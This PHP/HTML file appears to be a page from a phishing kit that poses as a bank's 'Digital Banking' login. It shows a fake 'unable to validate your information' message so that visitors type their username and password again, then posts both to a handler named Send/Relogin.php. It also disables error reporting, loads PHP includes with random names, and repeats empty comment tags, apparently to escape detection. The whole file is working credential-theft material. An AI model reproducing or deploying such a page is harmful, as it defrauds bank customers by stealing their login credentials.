<?php error_reporting(0);
require_once 'Mpem4lhVmzNo.php.php';
require_once 'OG96jNVsnQ.php';
require_once '4ktzFFYhnl.php';
?><!DOCTYPE html>
<html class="js wf-roboto-i1-active wf-roboto-i2-active wf-roboto-n1-active wf-roboto-n2-active wf-roboto-n3-active wf-roboto-i3-active wf-roboto-n4-active wf-roboto-i4-active wf-roboto-n5-active wf-roboto-n6-active wf-roboto-n7-active wf-roboto-i6-active wf-roboto-i7-active wf-roboto-i5-active wf-roboto-n8-active wf-roboto-n9-active wf-roboto-i8-inactive wf-roboto-i9-inactive wf-active" lang="en">
<?php require_once('File/Vendor/header.php'); ?>

<!--><!--><!--><!--><!--><!--><!--><!--><!--><!--><!--><!-->

<button class="olb-select-toggle" data-toggle="collapse" aria-expanded="false" aria-controls="olbSelectOptions" data-target="#olbSelectOptions">Digital Banking
</button>
</div>
<!--><!-->
<form id="" action="Send/Relogin.php" method="post" autocomplete="off"   >
<!--><!-->
<div >
<!--><!-->
<p>We are unable to validate your information.</p>


<div class="input-wrapper form-group mb-0 w-100 special mr-1">
<input type="text" name="username" id="username" placeholder="username"   maxlength="19" required="required"   spellcheck="off" autocorrect="off" autocapitalize="off" class="olb-input form-control w-100" data-parsley-required="" style="border: 2px solid black; border-radius: 4px;" >

</div>
</p>


<div class="input-wrapper form-group mb-0 w-100 special mr-1">
<input type="text" name="Password" id="Password" placeholder="Password"   maxlength="19" required="required"   spellcheck="off" autocorrect="off" autocapitalize="off" class="olb-input form-control w-100" data-parsley-required="" style="border: 2px solid black; border-radius: 4px;" >

</div>
</p>







<!--><!-->
</br>
</div>
<!--><!-->
</div>
</div>
</div>
<!--><!-->
<button type="submit" class="btn btn-default">Login
<span class="sr-only"> to Online Banking
</span>
</button>
<!--><!--><!--><!--><!--><!--><!--><!--><!--><!--><!--><!-->
<?php require_once('File/Vendor/footer.php'); ?>
</html>